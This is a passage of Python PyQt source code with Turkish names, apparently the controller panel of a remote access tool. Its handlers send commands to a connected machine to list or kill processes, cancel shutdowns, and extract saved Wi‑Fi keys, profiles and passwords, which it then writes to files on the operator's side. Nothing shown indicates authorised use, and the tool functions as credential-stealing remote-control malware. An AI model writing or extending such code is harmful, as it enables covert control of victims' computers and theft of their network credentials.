                    self.ui.outputcmdlabel.setText(new_exec2)
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    print(komut_ciktisi)
                    new_exec = new_exec2 + "\n" + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)
                except Exception as e:
                    print(e)
            elif "iptal" in secenek:
                print("iptal")
                komut.append("close_time_cancel")
                komut.append("shutdown /a")
                try:
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\n"
                    self.ui.outputcmdlabel.setText(new_exec2)
                    self.json_send(komut)
                    komut_ciktisi = "Kapatma iptal edildi"
                    new_exec = new_exec2 + "\n" + komut_ciktisi
                    self.ui.outputcmdlabel.setText(new_exec)
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)
    def wifi_option_selected(self):
        try:
            komut=[]
            selected_action = self.sender()
            print("Seçilen seçenek:", selected_action.text())
            secenek=selected_action.text()
            komut.append("wifi")
            if "key" in secenek:
                print("tüm")
                komut.append("tüm")
                print(komut)
                before_exec = self.ui.outputcmdlabel.text()
                new_exec2 = before_exec + "\nWifi verileri alınıyor.."
                self.ui.outputcmdlabel.setText(new_exec2)
                QApplication.processEvents()
                self.json_send(komut)
                komut_ciktisi = self.json_receiver()
                print(komut_ciktisi)
                new_exec3 = new_exec2 + "\n" + komut_ciktisi[0]
                self.ui.outputcmdlabel.setText(new_exec3)
                QApplication.processEvents()
                current_datetime = datetime.now()
                current_datetime = str(current_datetime)[:19]
                name = "Wifi_verileri:" + current_datetime + ".txt"
                self.save_file(name, komut_ciktisi[1])
                new_exec = new_exec2 + "\nWifi verileri indirilenler klasörüne kaydedildi."
                self.ui.outputcmdlabel.setText(new_exec)

            elif "profillerini" in secenek:
                print("profil")
                komut.append("profil")
                print(komut)
                before_exec = self.ui.outputcmdlabel.text()
                new_exec2 = before_exec + "\nProfil bilgileri alınıyor.."
                self.ui.outputcmdlabel.setText(new_exec2)
                self.json_send(komut)
                komut_ciktisi = self.json_receiver()
                print(komut_ciktisi)
                new_exec3 = new_exec2 + "\n" + komut_ciktisi[0]
                self.ui.outputcmdlabel.setText(new_exec3)
                current_datetime = datetime.now()
                current_datetime = str(current_datetime)[:19]
                name = "Profil_bilgileri:" + current_datetime + ".txt"
                self.save_file(name, komut_ciktisi[1])
                new_exec = new_exec3 + "\nProfil bilgileri indirilenler klasörüne kaydedildi."
                self.ui.outputcmdlabel.setText(new_exec)

            elif "şifresini" in secenek:
                print("şifre")
                komut.append("şifre")
                password, ok_pressed = QInputDialog.getText(self, "", "Profil adını giriniz:")
                if ok_pressed:
                    komut.append(password)
                print(password)
                try:
                    #Şİfreyi cmd ekranına yazmıyor
                    print(komut)
                    before_exec = self.ui.outputcmdlabel.text()
                    new_exec2 = before_exec + "\nŞifre alınıyor.."
                    QApplication.processEvents()
                    self.ui.outputcmdlabel.setText(new_exec2)
                    QApplication.processEvents()
                    self.json_send(komut)
                    komut_ciktisi = self.json_receiver()
                    new_exec3 = new_exec2 + "\n" + komut_ciktisi[0]
                    print(new_exec3)
                    self.ui.outputcmdlabel.setText(new_exec3)
                    QApplication.processEvents()
                    current_datetime = datetime.now()
                    current_datetime = str(current_datetime)[:19]
                    name = password + ":" + current_datetime + ".txt"
                    self.save_file(name, komut_ciktisi[1])
                    new_exec = new_exec3 + "\nŞifre indirilenler klasörüne kaydedildi."
                    self.ui.outputcmdlabel.setText(new_exec)
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)
    def tasklist_option_selected(self):
        try:
            komut = []
            selected_action = self.sender()
            print("Seçilen seçenek:", selected_action.text())
            secenek = selected_action.text()
            komut.append("tasklist")
            if "tüm" in secenek:
                print("tüm")
                komut.append("tüm")

            elif "kapat" in secenek:
                print("kapat")
                komut.append("kapat")
                process_name, ok_pressed = QInputDialog.getText(self, "", "İşlem adını giriniz:")
                if ok_pressed:
                    komut.append(process_name)
                print(process_name)

            print(komut)
            try:
                print(komut)
                before_exec = self.ui.outputcmdlabel.text()
                new_exec2 = before_exec + "\n"
                self.ui.outputcmdlabel.setText(new_exec2)
                self.json_send(komut)
                komut_ciktisi = self.json_receiver()
                new_exec = new_exec2 + "\n" + komut_ciktisi
                self.ui.outputcmdlabel.setText(new_exec)
            except Exception as e:
                print(e)
        except Exception as e:
            print(e)

a=SplashScreenApp()


